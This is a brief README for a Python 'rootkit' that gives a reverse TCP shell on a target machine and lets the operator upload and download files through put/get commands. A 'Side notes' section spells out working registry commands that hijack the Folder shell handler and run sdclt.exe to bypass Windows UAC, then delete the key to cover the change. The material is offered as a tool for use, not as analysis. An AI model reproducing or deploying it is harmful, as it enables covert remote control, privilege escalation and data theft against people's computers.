# Python-Rootkit
> Original Author: Maor Sabag
> 
A simple Python-Rootkit script

# Usage

1. Start up the server first to listen for TCP connection. Python3 server.py
2. Start the client side on the machine you want to get a reverse TCP shell.
3. Extra commands:
  - put|\<filename\> to upload the file on the client side.
  - get|\<filename\> up to download the file from the client to the current folder the script is running.


## Side notes:
reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "cmd.exe" /f && reg add HKCU\Software\Classes\Folder\shell\open\command /v "DelegateExecute" /f
%windir%\system32\sdclt.exe
reg delete "HKCU\Software\Classes\Folder\shell\open\command" /f
